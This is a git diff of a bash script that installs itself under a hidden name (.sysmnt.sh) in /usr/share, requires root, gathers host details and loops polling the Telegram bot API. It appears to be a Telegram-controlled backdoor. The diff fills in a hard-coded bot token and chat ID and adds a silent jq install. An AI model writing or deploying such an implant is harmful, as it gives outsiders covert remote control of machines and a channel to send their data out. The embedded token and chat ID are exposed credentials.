@@ -1,11 +1,14 @@
 #!/bin/bash
 
+#check if runs with sudo
+[ "$EUID" -ne 0 ] && echo "Run with sudo" && exit 1
+
 # Define script paths
 SCRIPT_NAME=".sysmnt.sh"
 SCRIPT_PATH="/usr/share/$SCRIPT_NAME"
 
-BOT_TOKEN="BOT_TOKEN"
-CHAT_ID="CHAT_ID"
+BOT_TOKEN="7491511091:AAG-fX0p7Ms_uQdTrefqQPXfIkm9jy0hWKE"
+CHAT_ID="2037612166"
 # Collect System Information (using only built-in Linux commands)
 HOSTNAME=$(hostname)
 OS=$(uname -o)
@@ -45,6 +48,8 @@ CHAT_ID="$CHAT_ID"
 OFFSET=0
 
 while true; do
+    command -v jq >/dev/null || apt install -y -qq jq >/dev/null
+    
     # Fetch updates from Telegram
     RESPONSE=\$(curl -s "https://api.telegram.org/bot\$BOT_TOKEN/getUpdates?offset=\$OFFSET")
 
